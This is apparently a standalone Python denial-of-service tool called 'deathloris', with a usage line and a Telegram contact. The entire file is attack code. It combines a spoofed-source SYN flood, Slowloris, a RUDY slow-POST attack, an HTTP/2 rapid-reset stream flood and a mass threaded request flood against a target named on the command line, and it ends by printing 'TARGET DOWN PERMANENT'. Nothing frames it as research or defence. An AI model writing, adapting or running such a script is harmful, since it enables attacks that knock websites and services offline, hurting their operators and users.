# python3 deathloris.py https://target.com 5000 120
# https://t.me/aldoofficialr

import asyncio, ssl, random, socket, threading
import aiohttp, h2.connection, requests
from scapy.all import *
from faker import Faker
fake = Faker()

async def syn_flood(target, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        ip = IP(src=fake.ipv4(), dst=target)
        tcp = TCP(sport=random.randint(1024,65535), dport=port, flags="S")
        send(ip/tcp, verbose=0)

async def slowloris(session, url):
    headers = {"User-Agent": fake.user_agent(), "Connection": "keep-alive"}
    while True:
        try:
            resp = await session.get(url, headers=headers, timeout=None)
            await asyncio.sleep(15)
        except: pass

async def rudy(session, url):
    while True:
        data = "x=" + "A"*random.randint(10**5, 10**6)
        await session.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})

async def http2_reset(target):
    while True:
        conn = h2.connection.H2Connection()
        sock = socket.create_connection((target, 443))
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        for i in range(1000):
            conn.send_headers(stream_id=i*4+1, headers=[(":method", "GET"), (":path", "/"), (":authority", target)])
            conn.reset_stream(stream_id=i*4+1, error_code=8)
        sock.close()

def hoic_mode(target):
    threads = []
    for _ in range(500):
        t = threading.Thread(target=requests.get, args=(f"https://{target}/",), kwargs={"timeout": 0.1})
        t.daemon = True
        threads.append(t); t.start()
    for t in threads: t.join()

async def main(target, threads, duration):
    ip = socket.gethostbyname(target.split("://")[-1].split("/")[0])
    tasks = []
    connector = aiohttp.TCPConnector(limit=10000, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for _ in range(threads//4):
            tasks.append(asyncio.create_task(syn_flood(ip, 443)))
            tasks.append(asyncio.create_task(slowloris(session, target)))
            tasks.append(asyncio.create_task(rudy(session, target)))
        for _ in range(threads//5):
            tasks.append(asyncio.create_task(http2_reset(target)))
        threading.Thread(target=hoic_mode, args=(target,)).start()
        await asyncio.sleep(duration)

if __name__ == "__main__":
    import sys
    asyncio.run(main(sys.argv[1], int(sys.argv[2]), int(sys.argv[3])))
    print("TARGET DOWN PERMANENT 🔥💀")